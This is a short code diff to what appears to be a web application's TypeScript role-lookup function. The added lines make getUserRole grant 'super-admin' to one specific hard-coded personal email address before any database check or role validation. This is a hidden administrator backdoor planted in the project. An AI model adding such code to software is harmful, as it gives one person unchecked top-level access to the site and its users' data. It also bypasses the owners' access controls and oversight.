@@ -227,6 +227,10 @@ function buildSystemConfigDocs(siteConfig: any) {
 }
 
 async function getUserRole(uid: string, email?: string, existingRole?: string): Promise<UserRole | null> {
+  if (email === 'landrymoutongo97@gmail.com') {
+    return 'super-admin';
+  }
+
   if (!getDb()) return null;
 
   const validRoles: UserRole[] = ['super-admin', 'admin', 'editor', 'stock-manager', 'support-client', 'customer'];
